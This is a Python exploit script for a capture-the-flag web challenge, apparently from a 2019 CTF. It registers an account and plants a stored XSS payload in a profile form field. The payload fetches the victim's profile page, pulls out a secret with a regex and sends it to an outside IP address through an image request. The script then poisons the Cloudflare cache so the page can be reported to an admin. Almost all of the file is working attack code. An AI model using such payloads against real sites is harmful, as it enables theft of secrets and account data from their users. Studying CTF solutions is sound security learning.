import requests, random

payload = '''fetch("/profile").then(function(e){e.text().then(function(f){new/**/Image().src='//35.240.159.190:3030/?'+/secret(.*)>/.exec(f)[0]})})'''
raw_data = '''------WebKitFormBoundary8XvNm1gXcAtb4Hik
Content-Disposition: form-data; name="firstname"

azz
------WebKitFormBoundary8XvNm1gXcAtb4Hik
Content-Disposition: form-data; name="lastname"

zzz
------WebKitFormBoundary8XvNm1gXcAtb4Hik
Content-Disposition: form-data; name="shoesize"

1 tabindex=1 contenteditable autofocus onfocus='''+payload+''' 
------WebKitFormBoundary8XvNm1gXcAtb4Hik
Content-Disposition: form-data; name="secret"

asd
------WebKitFormBoundary8XvNm1gXcAtb4Hik
Content-Disposition: form-data; name="avatar"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary8XvNm1gXcAtb4Hik--
'''

s = requests.Session()

s.get('http://web50.zajebistyc.tf/login')

username = 'hfs-'+str(random.randint(1000000,99999999))+".js"
password = username

headers_login = {'Content-Type': 'application/x-www-form-urlencoded'}
headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8XvNm1gXcAtb4Hik'}

# Register account
res = s.post('http://web50.zajebistyc.tf/login', headers=headers_login, data="login="+username+"&password="+password)

# XSS profile
res = s.post('http://web50.zajebistyc.tf/profile/'+username, data=raw_data, headers=headers)

# Poison cloudflare cache
s.get('http://web50.zajebistyc.tf/profile/'+username)

print "poisoned. go report "+'http://web50.zajebistyc.tf/profile/'+username
#another writeup: http://althims.com/teaser-confidence-ctf-2019/
#Upload SVG file --> XSS --> GET /profile/admin
